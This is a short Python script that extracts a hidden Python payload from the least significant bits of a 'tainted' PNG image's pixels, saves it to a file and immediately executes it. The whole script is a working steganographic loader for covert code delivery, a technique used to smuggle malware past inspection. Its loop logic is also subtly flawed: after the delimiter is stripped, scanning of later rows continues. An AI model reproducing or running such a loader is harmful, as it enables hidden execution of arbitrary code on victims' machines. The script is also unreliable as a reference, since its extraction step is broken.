from PIL import Image
import subprocess
import os

img_path = "./tainted.png"
output_payload_path = "./extracted_payload.py"

# Convert a list of bits to a character
def btoc(bits):
    c_val = 0
    bit_count = 7  # Big Endian
    for bit in bits:
        c_val += bit * (2 ** bit_count)
        bit_count -= 1
    return chr(c_val)

# Convert character to list of bits (used for delimiter)
def ctob(c):
    output = [0] * 8  # Default 0 to replace with 1 when needed
    c_val = ord(c)

    bit_count = 7  # Big Endian
    for i in range(len(output)):
        bit_value = pow(2, bit_count)
        if bit_value <= c_val:
            c_val -= bit_value
            output[i] = 1
        bit_count -= 1    

    return output

# Define delimiter for stopping condition
delimiter = "END"
delimiter_bits = []
for c in delimiter:
    delimiter_bits.extend(ctob(c))

# Pull in the tainted image
image = Image.open(img_path)
rgb_image = image.convert("RGB").load()

# Extract payload from image
width, height = image.size

# List to store the extracted bits
payload_bits = []

# Iterate over each pixel and extract LSBs
for y in range(height):
    for x in range(width):
        r, g, b = rgb_image[x, y]
        payload_bits.append(r & 0x01)  # Extract LSB of red channel
        payload_bits.append(g & 0x01)  # Extract LSB of green channel
        payload_bits.append(b & 0x01)  # Extract LSB of blue channel

        # Check if the last bits match the delimiter
        if payload_bits[-len(delimiter_bits):] == delimiter_bits:
            payload_bits = payload_bits[:-len(delimiter_bits)]  # Remove the delimiter
            break
    if payload_bits[-len(delimiter_bits):] == delimiter_bits:
        break

# Convert payload bits to characters
payload = ""
while len(payload_bits) >= 8:
    char_bits = payload_bits[:8]  # Take the first 8 bits
    payload_bits = payload_bits[8:]  # Remove those 8 bits
    payload += btoc(char_bits)  # Convert to character and append

# Save the extracted payload
with open(output_payload_path, "w", encoding="utf-8") as file:
    file.write(payload)

print(f"Successfully extracted payload to {output_payload_path}")

# Execute the extracted payload
try:
    print("Executing the extracted payload...")
    subprocess.run(["python", output_payload_path], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error occurred while executing the payload: {e}")
except FileNotFoundError:
    print(f"Error: Extracted payload not found at {output_payload_path}")
